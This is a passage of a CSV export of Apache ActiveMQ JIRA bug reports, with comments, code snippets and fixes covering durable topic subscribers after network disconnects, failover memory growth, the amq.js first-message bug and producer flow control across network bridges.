This issue can be avoided by using the default Store cursor, so the workaround is to configure the store cursor, restart, and revert back to the chosen cursor.",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,AMQ-3293,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,14585,,,Tue Jun 07 09:22:19 UTC 2011,,,,,,,,,,,"0|i0ajaf:",59398,,,,,,,,,,,,,,,,,,,,,"03/Jun/11 12:25;gtully;fix in http://svn.apache.org/viewvc?rev=1131010&view=rev;;;","06/Jun/11 04:48;maytripa;Hi Garry....
Is there a revision available for this defect on 5.5.0. As this defect is reproducible in our production and has major impact on us...Will it be possible to avail a patch so that we can apply and move on with this?
;;;","07/Jun/11 09:22;gtully;you can use the latest 5.6-SNAPSHOT[1] or apply the fix from http://svn.apache.org/viewvc?rev=1131010&view=rev

[1]https://repository.apache.org/content/repositories/snapshots/org/apache/activemq/apache-activemq/5.6-SNAPSHOT/;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Durable subscribers on durable topics don't receive messages after network disconnect,AMQ-3353,12509120,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,gtully,sfali16,sfali16,02/Jun/11 19:31,28/Mar/13 14:26,14/Jul/23 05:43,21/Mar/12 10:33,5.3.1,5.5.0,,,,5.6.0,,,Broker,,,,2,,,,,,,,,"I've set up a durable topic with the default (persistent) delivery mode on one machine that is publishing a simple text message every 5 seconds. I created a durable subscriber that consumes messages published to the above topic on another machine. I am using broker to broker communication between the two machines.
I start up the two programs on either machine and see the messages coming through to the subscriber. If I then pull the network cable to disconnect the network between the two machines, wait for a minute and then plug it back in, my subscriber doesn't receive the messages any more. I can see from the output that the publisher is still publishing them (Temporary topics, non-durable queues all continue to sync up in our production environment, it is only the durable topics that don't work after network reconnect)

If I were to tweak a setting on the publisher's broker (that was introduced only in 5.5.0), suppressDuplicateTopicSubscriptions=false, then the topics work correctly after network reconnect. But this may have other unintended consequences and I was hoping to get a better idea of:
- is this a known issue ? if so, then are there any specific challenges that have caused it not to be fixed?
- are other people out there using durable topics and subscribers without a failover option that have run into this problem? What have they done to work around?

Here is how my subscriber and publisher are set up:
Topic Publisher (Machine 1)
        publisherConnection = connFactory.createConnection();
        publisherConnection.setClientID( ""ProducerCliID"" );
        publisherConnection.start();

        session = publisherConnection.createSession( true, -1 );
        Destination producerTopic = session.createTopic( TEST_TOPIC_NAME );
        producer = session.createProducer( (Topic)producerTopic );
....
....
....
    // On a timer, keep sending this out every 5 seconds
                 String text = ""HELLO "" + count++;
                TextMessage msg = session.createTextMessage( text );
                System.out.println( ""Sending TextMessage = "" + msg.getText() );
                producer.send( msg );
                session.commit();

Subscriber ( Machine 2):
        Connection clientConnection = connFactory.createConnection();
        clientConnection.setClientID(""cliID"");
        clientConnection.start();
        Session session = clientConnection.createSession( false, Session.AUTO_ACKNOWLEDGE );

        Destination topic = session.createTopic( topicName );
        MessageConsumer subscriber = session.createDurableSubscriber( (Topic)topic, ""subName"" );

        TestMessageListener msgListener = new TestMessageListener( 1000 );
        subscriber.setMessageListener( msgListener );
.....
.....
         // TestMessageListener's onMessage method simply outputs the message:
        public void onMessage(Message message)
        {
            if ( message instanceof TextMessage )
            {
                System.out.println( ""Message received = "" + ((TextMessage)message) );
            }
        }

I can provide the jars for you to run the program if need be.
","Windows & Linux
JDK 1.6",acalvo,alin_aron_oana@yahoo.ca,anavarrog,ceposta,falcor,gtully,joeniski,noelady,tabish,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"05/Jun/12 07:46;acalvo;DurableSubscriberWithNetworkDisconnectTest.java;https://issues.apache.org/jira/secure/attachment/12530913/DurableSubscriberWithNetworkDisconnectTest.java","04/Jun/12 13:49;acalvo;DurableSubscriberWithNetworkDisconnectTest.java;https://issues.apache.org/jira/secure/attachment/12530778/DurableSubscriberWithNetworkDisconnectTest.java","06/Jul/11 07:46;acalvo;DurableSubscriberWithNetworkDisconnectTest.java;https://issues.apache.org/jira/secure/attachment/12485386/DurableSubscriberWithNetworkDisconnectTest.java","05/Jun/12 07:46;acalvo;TEST-org.apache.activemq.usecases.DurableSubscriberWithNetworkDisconnectTest.xml;https://issues.apache.org/jira/secure/attachment/12530912/TEST-org.apache.activemq.usecases.DurableSubscriberWithNetworkDisconnectTest.xml","06/Jul/11 09:45;acalvo;TEST-org.apache.activemq.usecases.DurableSubscriberWithNetworkDisconnectTest.xml;https://issues.apache.org/jira/secure/attachment/12485397/TEST-org.apache.activemq.usecases.DurableSubscriberWithNetworkDisconnectTest.xml","13/Jun/12 10:38;acalvo;embedded1.xml;https://issues.apache.org/jira/secure/attachment/12531946/embedded1.xml","13/Jun/12 10:38;acalvo;embedded2.xml;https://issues.apache.org/jira/secure/attachment/12531947/embedded2.xml","13/Jun/12 10:38;acalvo;example.tar.gz;https://issues.apache.org/jira/secure/attachment/12531948/example.tar.gz","13/Jun/12 10:38;acalvo;instructions.txt;https://issues.apache.org/jira/secure/attachment/12531949/instructions.txt","13/Jun/12 10:38;acalvo;standalone1.xml;https://issues.apache.org/jira/secure/attachment/12531950/standalone1.xml","13/Jun/12 10:38;acalvo;standalone2.xml;https://issues.apache.org/jira/secure/attachment/12531951/standalone2.xml","06/Jul/11 10:03;acalvo;test-results.ods;https://issues.apache.org/jira/secure/attachment/12485398/test-results.ods",,,,,,,,,,12.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,14548,,,Thu Mar 28 14:26:44 UTC 2013,,,,,,,,,,,"0|i0ajav:",59400,,,,,,,,,,,,,,,,,,,,,"16/Jun/11 11:28;acalvo;same problem here.

Tried with 5.4.2, 5.5.0, 5.6.0-SNAPSHOT and still having the same issue.

I've set up an environment with two brokers, and the producer and consumer provided in the example directory using durable topics.

After being disconnected for more than 1m, brokers are able to reconnect but consumer seems to be in an offline state which don't pending messages.
However, upon restarting the consumer, it'd get all pending messages.

Is there some kind of timeout between the consumer and the broker?;;;","23/Jun/11 16:07;joeniski;i also have this problem on AMQ 5.3.0 (in production), and in our AMQ 5.4.2 test environment (both on 32-bit RedHat Enterprise Linux, v.5.5). 

We have a store & forward network of brokers, much like the back-office/retail store example in ActiveMQ in Action. i use a duplexed networkConnector on the subscribers, with durable topic subscriptions. Queues and topics are defined as <dynamicallyIncludedDestinations> in the <networkConnector> configuration.

After a disconnect, i can see the brokers reconnecting in both the publisher's and subscribers' logs. Also, the AMQ web console on the publisher continues to show the durable ssubscriptions as on-line. But topic messages published during/after the outage aren't picked up unless i restart the subscriber broker.

Furthermore, queue messages *do* flow successfully between the two brokers after the reconnect.

i've added ""keepAlive=true"" and ""useExponentialBackoff=false"" to the URIs for my openwire and ssl transportConnectors, but neither setting has made any difference in the problem behavior.

Our current work-around is to monitor the message counts on publisher's and subscriber's topics, send an alert to our sysadmin team when they get out of synch, and manually restart the subscriber.

It's a relief to know that i'm not the only one...;;;","06/Jul/11 07:46;acalvo;(initial) JUnit case;;;","06/Jul/11 08:55;gtully;Andreas, thanks for the unit test. It has 32 tests in it (with all the variations), is that expected? I am giving it a run to see what it produces.;;;","06/Jul/11 08:59;acalvo;Gary,
We set up a bunch of options, such as failover over static, dynamic only, maxInactivity on wireFormat, and so on.
It should work always, but some are failing.

Moreover, it also performs a close or pause on the socket to simulate the network drop. ;;;","06/Jul/11 09:45;acalvo;surefire report;;;","06/Jul/11 10:03;acalvo;we found out that it is able to recover while performing a socket.pause() but not with a socket.close() (which, by the way, is the closest behavior that we expect);;;","06/Jul/11 10:45;gtully;the problem is the default value for setSuppressDuplicateTopicSubscriptions.

In the test, add {code}connector.setSuppressDuplicateTopicSubscriptions(false);{code} to {code} org.apache.activemq.usecases.DurableSubscriberWithNetworkDisconnectTest#bridgeBrokers{code}

That option was added for cyclic network topologies, where there are more than one route to a broker. But it should ignore durable subscriptions as they are already unique based on their subscription id.;;;","06/Jul/11 11:02;acalvo;We're concerned about the cyclic topology with a network of brokers.
If a durable topic subscription is requested more than once on the same broker, will ignore it?
thanks!;;;","06/Jul/11 12:18;gtully;yes, durable subs must be unique based on their connection id and subscriber name. A duplicate will be suppressed. Validated with a variation on the duplicate suppression test.
Am going to ensure that setSuppressDuplicateTopicSubscriptions ignores duplicate subs, such that it does not get in the way of normal durable sub reconnect, where the networked durable sub is offline pending a reconnect.;;;","12/Jul/11 17:27;gtully;Thinking more on this, the failover: protocol on a client is relevant here in that the networkConsumerId on a consumer advisory will be the same in the failover case, and different in the not failover case. this is distinct from the subscriberName:clientId pair. It may be that the networkConsumerId needs to be composed of the subscriberName:clientId for durable subs to properly implement duplicate subscription suppression.  ;;;","30/Jan/12 11:50;acalvo;@Gary
We are still trying to figure out this issue.
Using the latest SNAPSHOT for 5.6 doesn't solve it.
Our main concern is that using a NoB with static connections (and creating the responder from the central broker with duplex from the embedded broker) seems to throw an error.
However, using failover does not throw an error, but does not work either.

PS: NoB architecture is hub-and-spoke using embedded brokers
broker 1 (embedded) < - > central broker < - > broker 2 (embedded);;;","30/Jan/12 11:53;joeniski;Greetings:

As of Friday, 16 December, i'm no longer working at NWEA.

If you need assistance with Web-based MAP messaging, please contact Scott Dietrich (scott.dietreich@nwea.org) or Aaron Zoller (aaron.zoller@nwea.org).

Kind regards,
Joe
;;;","30/Jan/12 11:53;joeniski;Greetings:

As of Friday, 16 December, i'm no longer working at NWEA.

If you need assistance with Web-based MAP messaging, please contact Scott Dietrich (scott.dietreich@nwea.org) or Aaron Zoller (aaron.zoller@nwea.org).

Kind regards,
Joe
;;;","02/Feb/12 11:30;gtully;@Andreas, so where do we stand?
Do you have a variant of the test that shows the problem you are seeing that I can play with? Ie: a variant of the current test (DurableSubscriberWithNetworkDisconnectTest) from trunk that will fail? Please attach it to this jira if you do.;;;","21/Mar/12 10:33;gtully;resolving pending additional unit test that shows that there still is a problem.;;;","29/May/12 13:22;acalvo;@Gary,
We're still having the same issue.
It has become critical since it affects the brokers in a newtork of brokers when one of them is ""pulled out"" of the network and reconnected back after the inactivity timeout.
We'll try to update our test case with the latest stable release of 5.6 and report back.

A small snippet of the output after the client is being reconnected (removed broker pluged into the network):
jvm 1    |  INFO | brokerA Shutting down
jvm 1    |  WARN | Could not start network bridge between: vm://brokerA?async=false&network=true and: ssl://10.4.0.164:61616 due to: java.net.SocketTimeoutException: connect timed out
jvm 1    |  INFO | Establishing network connection from vm://brokerA?async=false&network=true to ssl://10.4.0.164:61616
jvm 1    |  INFO | Network connection between vm://brokerA#42 and ssl://10.4.0.164/10.4.0.164:61616(brokerB) has been established.

Notice how it is identified as connected it is not show as a durable subscriber in the topic.;;;","04/Jun/12 13:49;acalvo;Use Case updated to stable ActiveMQ 5.6.
Notice how the timeout parameter in the failover transport protocol has changed and now is using -1 instead of 0;;;","04/Jun/12 14:07;tabish;Tried you new test case against the latest trunk SNAPSHOT and it passes.  There's been a couple recent fixes since 5.6.0 for issues that could affect durable consumers so you may want to try out a 5.7-SNAPSHOT.;;;","05/Jun/12 07:46;acalvo;New test with 3 combinations for the maxReconnectAttemps (0,1 and -1).
It fails 13 out of 24.
Using 5.7-SNAPSHOT.

Repository Root: https://svn.apache.org/repos/asf
Repository UUID: 13f79535-47bb-0310-9956-ffa450edef68
Revision: 1346054
Node Kind: directory
Schedule: normal
Last Changed Author: gtully
Last Changed Rev: 1345202
Last Changed Date: 2012-06-01 16:32:50 +0200 (Fri, 01 Jun 2012);;;","13/Jun/12 10:38;acalvo;To discard a bad implementation of the process, I've reproduced the problem using the examples provided in the stable release.
I've had to modify the java code for both the ConsumerTool and ProducerTool to add a string property with the sender string.
I am reusing the producerClientId parameter to set the sender name.
The file example.tar.gz contains the example directory from ActiveMQ-5.6 stable release with the modified files.

The instructions.txt contains a detailed description of the process used.;;;","06/Sep/12 16:15;anavarrog;As Andreas Calvo pointed in post: 

https://issues.apache.org/jira/browse/AMQ-3353?focusedCommentId=13294334&page=com.atlassian.jira.plugin.system.issuetabpanels:comment-tabpanel#comment-13294334

this problem is already present in activemq 5.6, it's not fixed, I don't understand why it's closed, I'm affected too, exactly the same situation Andreas is experiencing.

Andreas?, is it fixed for you?.;;;","25/Feb/13 19:05;noelady;We have been experiencing this same issue on 5.7.0. When AMQ server is rebooted all clients reconnect as expected. However durable subscribers show as active but the consumer is not pulling new messages. You can see on the subscribers page, messages are being en-queued to the durable sub but not being de-queued. It has caused some expensive mistakes recently. Havng read through the above , I am still unclear on what the best workaround is or if a fix is in progress? ;;;","25/Feb/13 22:09;gtully;peek at the test case that works on trunk: https://github.com/apache/activemq/blob/trunk/activemq-unit-tests/src/test/java/org/apache/activemq/usecases/DurableSubscriberWithNetworkDisconnectTest.java

note how it is configured.
To demonstrate a bug, please make some changes to that test case or add some additional scenarios and then reopen this issue if it breaks.;;;","25/Feb/13 22:31;acalvo;[~gtully],
Thanks for the quick reply.
However, although when I made the test it failed (and now it doesn't), I don't think it captures truly the situation.
Using a proxy can throw the Inactivity Monitor (even if it's paused or closed), but it does not capture an abrupt stop of the broker or it's connections.
While doing more tests in the lab, throwing a socket disconnect error (that means, unplugging the network cable) seems to, as [~noelady] expressed, leave the durable subscribers in a zombie state: they seem to exists and receive packages, but aren't able to dequeue anything.
This fails as of ActiveMQ 5.7, haven't tested yet on 5.8.

If there is any way to cause a socket disconnect error programmatically, it may give us a hint.

I may note that, while using ActiveMQ the results are really bad, using fuse-09-16 seems to give better results.

Thanks!;;;","25/Feb/13 23:20;noelady;Thanks Gary. I can confirm my results are as Andreas Calvo previously stated. The situation occurs when you pull the network plug (or do a reboot on the hosting operating system). The problem does not occur when you stop and restart the activemq broker.Although as Andreas, I have not tried this against 5.8.0. I noticed there is a fix in 5.8.0 regarding durable subs, but specifically to offline deletions. I intend to run tests against this version before re-opening this bug.;;;","26/Feb/13 15:48;gtully;There is a test case that simulates a very flaky network by randomly closing the socket locally. It uses a tcpfaulty://.. transport.
see: org.apache.activemq.usecases.MulticastDiscoveryOnFaultyNetworkTest

Maybe you can use some variant of that to reproduce in a unit test.
When the network cable is unpluged, there is a delay in getting socket feedback that depends on the tcp stack settings for timeouts and retries. So from a java app perspective, connections that are half closed can appear valid for some period. Whatever the case, the broker should be able to deal with it though, and once the tcp stack reports the real state of the network, things should come back to normal. ;;;","28/Mar/13 12:07;alin_aron_oana@yahoo.ca;I'm seeing the exact same behavior when using a javax.jms.MessageConsumer.
Whenever I'm powering off or unplugging the master broker machine,The slave broker will take over the master role but the  consumers will not reconnect to the new master broker.
There are no logged errors or other type of messages on the consumer side. The consumer behaves like it is still connected to the previous master instance and it is waiting for the messages to arrive in the queue.  

I was thinking of implementing a thread on my consumer side which will query the JMS connection from time to time, hopefully this way the fail-over mechanism will kick in. Although I'm not convinced that this is the right approach.

The broker URL I'm using is: 
failover:(tcp://server1:61616?keepAlive=true&wireFormat.maxInactivityDuration=0,tcp://server2:61616?keepAlive=true&wireFormat.maxInactivityDuration=0)?randomize=false&updateURIsSupported=false&jms.prefetchPolicy.all=1


The ActiveMQ version I'm using is 5.8.0
The client side libraries were 5.4.2, 5.7.0 and 5.8.0
;;;","28/Mar/13 14:26;tabish;{code}
wireFormat.maxInactivityDuration=0
{code}

Turns off the built in keep alive functionality and the default TCP keepalive is usually two hours so you'd need to tune the OS to rely on that.  Why not just turn on the standard inactivity monitoring instead of trying to reinvent the wheel?;;;",,,,,,,,,,,,,,,,,,,,,,,,,,
failover ConnectionStateTracker can lead to OOM with TextMessages,AMQ-3352,12509110,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,gtully,gtully,gtully,02/Jun/11 17:11,20/Sep/11 10:42,14/Jul/23 05:43,02/Jun/11 22:53,5.5.0,,,,,5.6.0,,,JMS client,,,,0,jmsclient,OOM,textmessage,,,,,,"With a reasonable large textmessage, the connection state tracker, which keeps an LRU cache of messages for redelivery on failover, can grow. The problem is the use of message size, which is approximated before marshaling. The approximation is > the encoded size so the size increments on a track back are larger than the decrements on a track, which lease to growth in the number of messages cached and can lead to an OOM.

The fix appears to be to not cache a copy of the message, such that the increment when the message is evicted will reflect the decrement after marshaling. 

The change that exposed this issue is https://issues.apache.org/jira/browse/AMQ-2585 - without that change the state tracker capacity would shrink.",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,14583,,,Thu Jun 02 22:53:51 UTC 2011,,,,,,,,,,,"0|i0ajb3:",59401,,,,,,,,,,,,,,,,,,,,,"02/Jun/11 22:53;gtully;fix in http://svn.apache.org/viewvc?rev=1130865&view=rev

The state tracker no longer holds a copy so that it gets the correct message size after marshaling.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
amq.js initHandler() method swallows first message received,AMQ-3350,12509087,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Trivial,Fixed,davsclaus,kseiss,kseiss,02/Jun/11 14:13,02/Apr/14 23:54,14/Jul/23 05:43,03/Nov/13 07:54,5.5.0,,,,,5.10.0,5.9.1,,,,,,0,,,,,,,,,"The very first message received by a javascript client (when using {{amq.js}}) is swallowed with no action. This is because the {{sendPoll()}} method calls {{initHandler()}} from the {{successCallback}} handler when the message arrives and the boolean {{sessionInitialized}} is false. This sends the code into the {{initHandler()}} method which in the end just calls {{sendPoll()}} again.  It never bothers calling {{pollHandler()}} to deal with the message it received.
{code:title=amq.js|borderStyle=solid}

        // *** This method does not process the data passed in. It just calls sendPoll() again!
	var initHandler = function(data) {
		sessionInitialized = true;
		if(sessionInitializedCallback) {
			sessionInitializedCallback();
		}
		sendPoll();
	}

	var sendPoll = function() {
		// Workaround IE6 bug where it caches the response
		// Generate a unique query string with date and random		
		var now = new Date();
		var timeoutArg = sessionInitialized ? timeout : 0.001;
		var data = 'timeout=' + timeoutArg * 1000
				 + '&d=' + now.getTime()
				 + '&r=' + Math.random();

		var successCallback = sessionInitialized ? pollHandler : initHandler;
        
		var options = { method: 'get',
			data: addClientId( data ),
			success: successCallback,
			error: pollErrorHandler};
		adapter.ajax(uri, options);
	};
{code} 
",MAC OS X (10.6),davsclaus,zgl,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,72251,,,Sun Nov 03 07:54:22 UTC 2013,,,,,,,,,,,"0|i0ealz:",81481,,,,,,,,,,,,,,,,,,,,,"02/Jun/11 16:51;kseiss;A fix that is working for me is to change the {{sendPoll();}} call in {{initHandler()}} to {{pollHandler(data);}}

My method now looks like this and it is working as expected:
{code:title=amq.js|borderStyle=solid}
	var initHandler = function(data) {
		sessionInitialized = true;
		if(sessionInitializedCallback) {
			sessionInitializedCallback();
		}
		//sendPoll();
		pollHandler(data);
	}

{code} ;;;","02/Nov/13 22:03;davsclaus;This is for the web-demo's;;;","03/Nov/13 07:54;davsclaus;Thanks for the patch.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Update reference to Jencks project ,AMQ-3343,12508932,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Trivial,Fixed,dejanb,gerald.preissler,gerald.preissler,01/Jun/11 09:17,01/Jun/11 12:16,14/Jul/23 05:43,01/Jun/11 12:16,,,,,,,,,Documentation,,,,0,,,,,,,,,"The javadoc at http://activemq.apache.org/maven/activemq-core/apidocs/org/apache/activemq/pool/PooledConnectionFactory.html has a reference to http://jencks.org/. This project seems to have moved to codehaus, I can find it here: http://jencks.codehaus.org/ . I suggest to update the docu.",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,74698,,,Wed Jun 01 12:16:06 UTC 2011,,,,,,,,,,,"0|i182yf:",255281,,,,,,,,,,,,,,,,,,,,,"01/Jun/11 12:16;dejanb;This JavaDoc is already updated

http://activemq.apache.org/maven/5.5.0/activemq-pool/apidocs/org/apache/activemq/pool/PooledConnectionFactory.html

This link is rather old. I also updated JavaDocs and QuickLinks pages, to point to newer docs;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Shutdown of broker waiting for shared fileystem lock blocks,AMQ-3342,12508886,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Minor,Fixed,tabish,artnaseef,artnaseef,31/May/11 23:29,20/Sep/11 10:42,14/Jul/23 05:43,06/Jul/11 15:45,5.4.2,,,,,5.6.0,,,Broker,,,,0,,,,,,,,,"Shutting down a broker that has not completed startup due to waiting for a shared filesystem lock does not complete.

Using an internal BrokerService() and it's stop() method is definitely impacted.

The attached patch simply adds a check for ""isStopped() || isStopping()"" to the MessageDatabase lock loop.",,artnaseef,zgl,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"31/May/11 23:38;artnaseef;amq-3342.patch;https://issues.apache.org/jira/secure/attachment/12481012/amq-3342.patch",,,,,,,,,,,,,,,,,,,,,1.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,60070,,,Wed Jul 06 15:45:07 UTC 2011,,,,,,,Patch Available,,,,"0|i0agun:",59003,,,,,,,,,,,,,,,,,,,,,"31/May/11 23:38;artnaseef;Patch which eliminates the blocking.;;;","06/Jul/11 15:45;tabish;Created a test case to validate the issue.

Applied patch with some small changes, thanks!;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
"When a producer from a network bridge is blocked by producer flow control, all producers from the network bridge get blocked.",AMQ-3331,12507786,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,gtully,stirlingc,stirlingc,19/May/11 17:23,01/Feb/13 17:23,14/Jul/23 05:43,01/Feb/13 17:23,5.5.0,,,,,5.6.0,5.8.0,,Broker,Test Cases,Transport,,0,,,,,,,,,"Symptom
=======
Broker A produces messages to two queues, Q1 and Q2.  Broker B consumes messages from two queues, Q1 and Q2.  Broker A is connected by a demand forwarding bridge, over TCP, to Broker B so that messages produced to Q1/Q2 will be forwarded to the consumers on Broker B.

At some point, Broker B's instance of Q2 becomes full (e.g., because the Q2 consumer is slow), and this triggers producer flow control to halt new messages being sent to Broker B's Q2 over the bridge.  Broker A's instances of Q1/Q2 are not full, so the producers on Broker A are not blocked.

If the messages produced by Broker A are *persistent*, we see this behaviour over the course of the production of 1000 messages to both Q1/Q2, where Broker B's Q2 becomes full on the 500th message:

{noformat}
Broker A       Bridge        Broker B
========                     ========
0->1000->0     ------>       0->1000->...
0->1000->500                 0->500->...
{noformat}

The above results, which assume network and consumer prefetch sizes of 1, are what we expected, namely: 
# Broker A produces 1000 messages to Q1 without blocking and all of these messages are forwarded to Broker B's Q1 without blocking, eventually being consumed by Broker B's Q1 consumer.
# Broker A produces 1000 messages to Q2 without blocking and 500 of these messages are forwarded to Broker B's Q2 before producer flow control blocks the flow until Broker B's Q2 consumer can start reducing the queue size.


This is good because the bridge treats Q1 and Q2 independently (i.e., producer flow control on Q2 does not block the messages forwarded to Q1).

If the messages produced by Broker A are *non-persistent*, we see this behaviour:

{noformat}
Broker A       Bridge        Broker B
========                     ========
0->1000->500   ------>       0->500->...
0->1000->500                 0->500->...
{noformat}

The above results, which assume network and consumer prefetch sizes of 1, are not what we expected, namely: producer flow control on Broker B's instance of Q2 blocks the forwarding of messages to Broker B's instance of Q1.

This is not good because producer flow control on Q2 essentially triggers producer flow control on Q1, even though Q1 is *not* full.

It also seems strange (and almost non-intuitive until you understand the cause), that peristent messages should behave better than non-persistent messages.  The same difference in behaviour can also be observed with persistent messages if Broker A these outside a JMS transaction (e.g., AUTO_ACKNOWLEDGE) versus inside a JMS transaction: outside behaves appropriately, with Q1 independent of Q2, but inside behaves the same as the non-persistent case with Q1 blocked by Q2.

These observations are contrary to the AMQ 5.0 documentation regarding producer flow control: {quote}As of ActiveMQ 5.0, we can now individually flow control each producer on a shared connection without having to suspend the entire connection.{quote}

Cause
=====

The difference in behaviour between persistent and non-persistent (and transactionaly/non-transactional) is due to the two ways that org.apache.activemq.broker.region.Queue implements producer flow control:

{code:title=Queue#send(...)}
// We can avoid blocking due to low usage if the producer is
// sending
// a sync message or if it is using a producer window
if (producerInfo.getWindowSize() > 0 || message.isResponseRequired()) {
{code}

and

{code:title=Queue#send(...)}
} else 
  if (memoryUsage.isFull()) {
    waitForSpace(context, memoryUsage, ""Usage Manager Memory Limit is full. Producer (""
                                + message.getProducerId() + "") stopped to prevent flooding ""
                                + getActiveMQDestination().getQualifiedName() + "".""
                                + "" See http://activemq.apache.org/producer-flow-control.html for more info"");
  }
{code}

There is only a single transport thread that services the TCP socket on Broker B.  This TCP socket is the ""remote"" end of the A->B bridge and is responsible for *sequentially* enqueueing to Broker B's queues all messages from Broker A.  When a non-persistent or transactional message is sent to Broker A's queues, it has +responseRequired=true+, which is preserved when the bridge forwards the message to Broker B's queues.  If producer flow control is triggered on Broker B's queue, the first method of producer flow control will be used: the transport thread will not block, but the repsonse will be held back until the queue has room.  As a result, the transport thread is free to continue enqueueing messages from the bridge, particularly those destined for queues that are not full (NOTE: since the network prefetch is 1 no new messages to the full queue will be forwarded until the response is returned).

When a persistent or non-transactional message is sent to Broker A's queues, it has +responseRequired=false+, which is preserved when the bridge forwards the message to Broker B's queues.  If producer flow control is triggered on Broker B's queue, the second method of producer flow control will be used: the transport thread will be blocked.  As a result, no other messages from the bridge will be forwarded, even those destined for queues that are not full.

The preservation of the {{responseRequired}} flag occurs in org.apache.activemq.network.DemandForwardingBridgeSupport:

{code:title=DemandForwardingBridgeSupport#serviceLocalCommand(...)}
if (!message.isResponseRequired()) {
    
    // If the message was originally sent using async
    // send, we will preserve that QOS
    // by bridging it using an async send (small chance
    // of message loss).
    try {
        remoteBroker.oneway(message);
        localBroker.oneway(new MessageAck(md, MessageAck.INDIVIDUAL_ACK_TYPE, 1));
        dequeueCounter.incrementAndGet();
    } finally {
        sub.decrementOutstandingResponses();
    }
    
} else {
    
    // The message was not sent using async send, so we
    // should only ack the local
    // broker when we get confirmation that the remote
    // broker has received the message.
    ResponseCallback callback = new ResponseCallback() {
        public void onCompletion(FutureResponse future) {
            try {
                Response response = future.getResult();
                if (response.isException()) {
                    ExceptionResponse er = (ExceptionResponse) response;
                    serviceLocalException(er.getException());
                } else {
                    localBroker.oneway(new MessageAck(md, MessageAck.INDIVIDUAL_ACK_TYPE, 1));
                    dequeueCounter.incrementAndGet();
                }   
            } catch (IOException e) {
                serviceLocalException(e);
            } finally {
                sub.decrementOutstandingResponses();
            }
        }
    };
    
    remoteBroker.asyncRequest(message, callback);
}
{code}

